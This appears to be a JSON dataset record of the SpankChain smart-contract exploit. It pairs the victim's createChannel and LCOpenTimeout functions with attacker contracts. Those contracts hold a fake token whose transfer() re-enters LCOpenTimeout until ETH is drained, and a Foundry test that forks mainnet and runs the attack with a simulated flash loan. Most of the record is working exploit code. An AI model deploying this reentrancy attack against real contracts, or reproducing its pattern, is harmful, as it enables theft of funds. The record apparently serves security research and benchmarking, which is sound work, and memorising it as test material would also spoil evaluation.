[
  {
    "contract/interface": "ISpankChain",
    "source_type": "victim_contract",
    "function_name": "LCOpenTimeout",
    "original_code": "    function LCOpenTimeout(bytes32 _lcID) public {\n        require(msg.sender == Channels[_lcID].partyAddresses[0] && Channels[_lcID].isOpen == false);\n        require(now > Channels[_lcID].LCopenTimeout);\n\n        if(Channels[_lcID].initialDeposit[0] != 0) {\n            Channels[_lcID].partyAddresses[0].transfer(Channels[_lcID].ethBalances[0]);\n        } \n        if(Channels[_lcID].initialDeposit[1] != 0) {\n            require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], Channels[_lcID].erc20Balances[0]),\"CreateChannel: token transfer failure\");\n        }\n\n        emit DidLCClose(_lcID, 0, Channels[_lcID].ethBalances[0], Channels[_lcID].erc20Balances[0], 0, 0);\n\n        // only safe to delete since no action was taken on this channel\n        delete Channels[_lcID];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISpankChain",
    "source_type": "victim_contract",
    "function_name": "createChannel",
    "original_code": "    function createChannel(\n        bytes32 _lcID,\n        address _partyI,\n        uint256 _confirmTime,\n        address _token,\n        uint256[2] _balances // [eth, token]\n    ) \n        public\n        payable \n    {\n        require(Channels[_lcID].partyAddresses[0] == address(0), \"Channel has already been created.\");\n        require(_partyI != 0x0, \"No partyI address provided to LC creation\");\n        require(_balances[0] >= 0 && _balances[1] >= 0, \"Balances cannot be negative\");\n        // Set initial ledger channel state\n        // Alice must execute this and we assume the initial state \n        // to be signed from this requirement\n        // Alternative is to check a sig as in joinChannel\n        Channels[_lcID].partyAddresses[0] = msg.sender;\n        Channels[_lcID].partyAddresses[1] = _partyI;\n\n        if(_balances[0] != 0) {\n            require(msg.value == _balances[0], \"Eth balance does not match sent value\");\n            Channels[_lcID].ethBalances[0] = msg.value;\n        } \n        if(_balances[1] != 0) {\n            Channels[_lcID].token = HumanStandardToken(_token);\n            require(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),\"CreateChannel: token transfer failure\");\n            Channels[_lcID].erc20Balances[0] = _balances[1];\n        }\n\n        Channels[_lcID].sequence = 0;\n        Channels[_lcID].confirmTime = _confirmTime;\n        // is close flag, lc state sequence, number open vc, vc root hash, partyA... \n        //Channels[_lcID].stateHash = keccak256(uint256(0), uint256(0), uint256(0), bytes32(0x0), bytes32(msg.sender), bytes32(_partyI), balanceA, balanceI);\n        Channels[_lcID].LCopenTimeout = now + _confirmTime;\n        Channels[_lcID].initialDeposit = _balances;\n\n        emit DidLCOpen(_lcID, msg.sender, _partyI, _balances[0], _token, _balances[1], Channels[_lcID].LCopenTimeout);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploitHelper",
    "source_type": "attacker_contract",
    "function_name": "exploit",
    "original_code": "    function exploit(\n        uint256 c\n    ) public payable {\n        limit = c;\n        uint256[2] memory balances;\n        balances[0] = 5_000_000_000_000_000_000;\n        balances[1] = 1;\n        spankChain.createChannel{value: 5 ether}(\n            hex\"4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45\",\n            msg.sender,\n            type(uint256).max - block.timestamp + 1,\n            address(this),\n            balances\n        );\n        spankChain.LCOpenTimeout(hex\"4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45\");\n        payable(msg.sender).transfer(address(this).balance);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploitHelper",
    "source_type": "attacker_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address recipient, uint256 amount) public returns (bool) {\n        if (count < limit) {\n            count = count + 1;\n            spankChain.LCOpenTimeout(hex\"4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45\");\n        }\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploitHelper",
    "source_type": "attacker_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", blocknumToForkFrom);\n        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit\n        fundingToken = address(0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SpankChainExploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public balanceLog {\n        //implement exploit code here\n        vm.deal(address(this), 5 ether); //simulation flashloan\n        SpankChainExploitHelper h = new SpankChainExploitHelper();\n        h.exploit{value: 5 ether}(32);\n        payable(address(0x0)).transfer(5 ether); //simulation replay flashloan\n    }\n\n",
    "description": ""
  }
]